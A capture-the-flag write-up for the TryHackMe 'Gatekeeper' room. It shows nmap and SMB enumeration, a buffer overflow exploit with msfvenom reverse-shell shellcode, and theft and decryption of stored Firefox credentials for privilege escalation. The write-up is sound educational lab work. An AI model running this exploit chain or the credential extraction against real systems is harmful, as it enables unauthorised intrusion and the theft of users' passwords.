# Gatekeeper [TryHackMe]

<sub>_This is a raw write-up. It accounts for every step taken throughout the challenge, whether or not it was successful. So, expect a lot of rabbitholes and frustration. At the time of writing this, I don't even know if I've solved the challenge myself. You might see a flag somewhere titled **<sup>Assisted by [write-up link]</sup>** which means I used someone else's write-up to complete the challenge. Being a responsible learner, I'm trying my best to accept as little help as possible and only when I'm out of ideas._</sub> 

## _Manual Exploitation_

Let's define the `targ3t` variable to reuse later:

```
targ3t=10.10.208.170
```

Let's perform an `nmap` scan and check for open ports:

```
nmap -p- -Pn $targ3t -oN nmap.scan -vv
```

It appears that open ports for this machine are `135`, `139`, `445` and `3389` and more, full list:

```
Discovered open port 445/tcp on 10.10.208.170
Discovered open port 3389/tcp on 10.10.208.170
Discovered open port 135/tcp on 10.10.208.170
Discovered open port 139/tcp on 10.10.208.170
Discovered open port 49154/tcp on 10.10.208.170
Discovered open port 49165/tcp on 10.10.208.170
Discovered open port 49160/tcp on 10.10.208.170
Discovered open port 49161/tcp on 10.10.208.170
Discovered open port 31337/tcp on 10.10.208.170
Discovered open port 49153/tcp on 10.10.208.170
Discovered open port 49152/tcp on 10.10.208.170
```

Let's perform a script scan on these:

```
nmap -p 135,139,445,3389,49152,49153,31337,49160,49154,49165,49161 --script=vuln $targ3t -oN nmap.vuln.scan -v
```

Interesting results, especially this one:

```
31337/tcp open  Elite
```

Let's enumerate SMB with `nmap`'s scripts:

```
nmap -p 445 --script=smb-* $targ3t -oN nmap.smb.scan -vv
```

Seems like there is an SMB share with a binary `gatekeeper.exe` on it. I think it would be a good guess to say, that `gatekeeper.exe` is a server application we can interact with on port `31337`:

```
| smb-ls: Volume \\10.10.208.170\USERS
| SIZE   TIME                 FILENAME
| <DIR>  2009-07-14T03:20:08  .
| <DIR>  2009-07-14T03:20:08  ..
| <DIR>  2020-05-15T01:57:06  Share
| 13312  2020-05-15T01:19:17  Share\gatekeeper.exe
```

```
smbclient '\\10.10.208.170\USERS' -U guest
```

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu May 14 21:57:08 2020
  ..                                 DR        0  Thu May 14 21:57:08 2020
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Share                               D        0  Thu May 14 21:58:07 2020

                7863807 blocks of size 4096. 3901605 blocks available
smb: \> cd Share
smb: \Share\> ls
  .                                   D        0  Thu May 14 21:58:07 2020
  ..                                  D        0  Thu May 14 21:58:07 2020
  gatekeeper.exe                      A    13312  Mon Apr 20 01:27:17 2020

                7863807 blocks of size 4096. 3901605 blocks available
smb: \Share\> get gatekeeper.exe
getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (26.7 KiloBytes/sec) (average 26.7 KiloBytes/sec)
```

Now I can use my local Windows VM to reverse engineer this executable for buffer overflows!

I'm going to use `x32dbg` for this one. Ran the `gatekeeper.exe` on a Windows VM and connected to it via kali on:

```
nc 192.168.0.111 31337
```

This gives only a simple prompt which I filled with `A` characters and it overwrote EIP really really fast. So I'll generate a cyclic pattern to simply understand where the offset is:

```
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

Reran the debugger and pasted this into the prompt. Then copied the EIP value `39654138` and checked it here:

```
└─$ /usr/bin/msf-pattern_offset -q 39654138
[*] Exact match at offset 146
```

So now that we control the EIP, let's find some jump points. Let's generate a byte array (I borrowed `bytearray.py` from [Brainstorm](../thm_brainstorm/README.md) room I did the other day):

```
python3 bytearray.py "\x00"
```

Also borrowed `exploit.py` from the Brainstorm write-up I mentioned above. I'll adjust it as needed for this machine and paste this bytearray inside the payload variable:

```
offset = 146
overflow = "A" * offset
retn = "B"*4
padding = ""
payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""
```

Before sending this buffer over we need to configure the `ERC` and then  generate a bytearray excluding the `\x00` in `x32dbg`:

```
ERC --config SetWorkingDirectory C:\Users\windows\Desktop\
ERC --bytearray -bytes "\x00"
```

Now we can send the buffer:

```
python3 exploit.py
Connected to target.
Sending evil buffer as a message...
Done!
```

Now let's compare these byte by byte using the ESP address  and make note of the bad chars:

```
ERC --compare 0109EEAC C:\Users\user\Desktop\ByteArray_1.bin
```

The bad chars: `\x00\x0a`

Let's generate a shellcode excluding these chars:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.109 LPORT=9822 EXITFUNC=thread -b "\x00\x0a" -f c
```

Let's paste this in the `payload` variable of our script and add 10 NOP chars in each `padding` and `postfix`. But we also need to find a jump point. 

```
ERC --SearchMemory FF E4
```

It found a number of jump points, but I chose the following one: `0x080414C3`. Let's rewrite it in little endian and add it to the retn variable.

```
retn = \x13\x08\x93\x6d
```

Hoping it will work, I'll rerun the binary and attack it with the script:

```
listening on [any] 9822 ...
connect to [192.168.0.109] from (UNKNOWN) [192.168.0.111] 50060
Microsoft Windows [Version 10.0.22621.4890]
(c) Microsoft Corporation. All rights reserved.

C:\Users\windows\Desktop\gatekeeper>whoami
whoami
desktop-n9ia851\windows

C:\Users\windows\Desktop\gatekeeper>
```

It returned a shell on my local machine. Now I will try the same thing for the TryHackMe machine:

```
listening on [any] 80 ...
connect to [10.11.100.243] from (UNKNOWN) [10.10.94.199] 49203
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  08:24 PM    <DIR>          .
05/14/2020  08:24 PM    <DIR>          ..
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
05/14/2020  08:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,885,426,688 bytes free

C:\Users\natbat\Desktop>type user.txt.txt
type user.txt.txt
{H4lf_W4y_Th3r3}

The buffer overflow in this room is credited to Justin Steven and his
"dostackbufferoverflowgood" program.  Thank you!
```

Alright, now we need to escalate privileges to be able to see the root flag. 

> I looked around for some common PrivEsc sequences on Windows, but couldn't find anything. With the help of this [write-up](https://ronamosa.io/docs/hacker/tryhackme/gatekeeper/) I made it work:

So apparently there's a Firefox shortcut on desktop:

```
C:\Users\natbat\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3ABE-D44B

 Directory of C:\Users\natbat\Desktop

05/14/2020  08:24 PM    <DIR>          .
05/14/2020  08:24 PM    <DIR>          ..
04/21/2020  04:00 PM             1,197 Firefox.lnk
04/20/2020  12:27 AM            13,312 gatekeeper.exe
04/21/2020  08:53 PM               135 gatekeeperstart.bat
05/14/2020  08:43 PM               140 user.txt.txt
               4 File(s)         14,784 bytes
               2 Dir(s)  15,751,954,432 bytes free
```

Apparently, this is where you find Firefox profiles on Windows:

```
 Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

04/21/2020  04:00 PM    <DIR>          .
04/21/2020  04:00 PM    <DIR>          ..
05/14/2020  09:45 PM    <DIR>          ljfn812a.default-release
04/21/2020  04:00 PM    <DIR>          rajfzh3y.default
               0 File(s)              0 bytes
               4 Dir(s)  15,896,350,720 bytes free
```

In the `ljfn812a.default-release` there is a `logins.json` file, which contains the following:

```
C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release>type logins.json
type logins.json
{"nextId":2,"logins":[{"id":1,"hostname":"https://creds.com","httpRealm":null,"formSubmitURL":"","usernameField":"","passwordField":"","encryptedUsername":"MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECL2tyAh7wW+dBAh3qoYFOWUv1g==","encryptedPassword":"MEIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECIcug4ROmqhOBBgUMhyan8Y8Nia4wYvo6LUSNqu1z+OT8HA=","guid":"{7ccdc063-ebe9-47ed-8989-0133460b4941}","encType":1,"timeCreated":1587502931710,"timeLastUsed":1587502931710,"timePasswordChanged":1589510625802,"timesUsed":1}],"potentiallyVulnerablePasswords":[],"dismissedBreachAlertsByLoginGUID":{},"version":3}
```

Which means, all we need to do really, is grab the encrypted credentials and decrypt them. So I copied them to the SMB share where we initially found `gatekeeper.exe`:

```
C:\Users\Share>xcopy "C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles" "C:\Users\Share" /E /I /H /Y
```

Now we can navigate to that share and download these files:

```
smb: \Share\ljfn812a.default-release\> mget *
```

Now we need to use this to decrypt it:

```
git clone https://github.com/lclevy/firepwd.git
python3 firepwd.py -d ../ljfn812a.default-release
```

The output is long but the last line is what matters:

```
decrypting login/password pairs
   https://creds.com:b'mayor',b'8CL***IsV'
```

Let's use them to see the root flag:

```
xfreerdp /u:mayor /p:8CL***IsV /v:$targ3t
```

The root flag is right there on the desktop in the file `root.txt`!

